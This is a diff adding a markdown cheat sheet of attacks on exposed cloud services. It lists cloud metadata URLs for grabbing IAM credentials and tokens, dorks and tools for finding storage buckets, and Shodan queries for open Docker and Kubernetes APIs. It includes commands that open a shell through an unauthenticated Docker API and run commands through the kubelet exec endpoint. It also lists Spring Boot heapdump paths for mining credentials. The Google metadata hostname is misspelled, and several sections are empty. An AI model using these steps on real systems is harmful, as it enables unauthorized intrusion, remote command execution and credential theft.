@@ -1,0 +1,58 @@
+- _Find these services using GDorks or Shodan or Censys or GitHub_
+
+---
+
+#### Identity Metadata Service
+- __AWS__
+	- _http:\/\/169.254.169.254/latest/meta-data/iam/security-credentials /\<rolename\>_ (meta-data, user-data)
+- __Microsoft Azure__
+	- _http:\/\/169.254.169.254/metadata/identity/oauth2/token_
+- __Google IAM__
+	- _http:\//meadata.google.internal/computeMetadata/v1/project/_ (resolves to 169.254.169.254)
+- __Oracle Cloud__
+	- _http:\/\/169.254.169.254/opc/v1/instance/metadata/\<key-name\>_
+- __Alibaba Cloud__
+	- _http:\/\/100.100.100.200/latest/meta-data/_
+
+#### Cloud Storage Buckets
+- `site:.s3.amazonaws.com "domain.com"` (GDork)
+- https://github.com/ghostlulzhacks/s3brute
+- https://github.com/RhinoSecurityLabs/GCPBucketBrute (google cloud)
+- `site:digitaloceanspaces.com domain.com` (GDork)
+- https://github.com/appsecco/spaces-finder
+- Azure (GDork)
+
+#### Docker API
+- _Port: 2375_ `product:"docker"` (Shodan)
+- _/version_ endpoint -> check
+- `docker -H <host>:<port> ps`
+- `docker -H <host>:<port> exec -it <container name> /bin/bash` (Pop Shell)
+- Depending on the docker version -> exploit to break out of the container into the host machine
+- Deploying your own docker containers
+#### Kubernetes API
+- _Port: 10250_ `product:"kubernetes"` (Shodan)
+- _/pods_ endpoint -> check
+```bash
+curl –insecure -v -H "X-Stream-Protocol-Version: v2.channel.k8s.io" -H "X-  
+Stream-Protocol-Version: channel.k8s.io" -H "Connection: upgrade" -H  
+"Upgrade: SPDY/3.1" -X POST  
+"https://<DOMAIN>:<PORT>/exec/<NAMESPACE>/<POD  
+NAME>/<CONTAINER NAME>?command=<COMMAND TO  
+EXECUTE>&input=1&output=1&tty=1"
+```
+
+#### Springboot 
+- __Endpoints__
+	- /datahub/actuator/heapdump
+	- /datahub/heapdump
+	- /actuator/heapdump
+	- /heapdump
+- Try download _heapdump_ -> Eclipse Memory Analyzer -> Dominator view -> Search creds
+
+#### Jenkins
+
+#### JIRA
+
+#### Atlassian
+
+#### Kibana
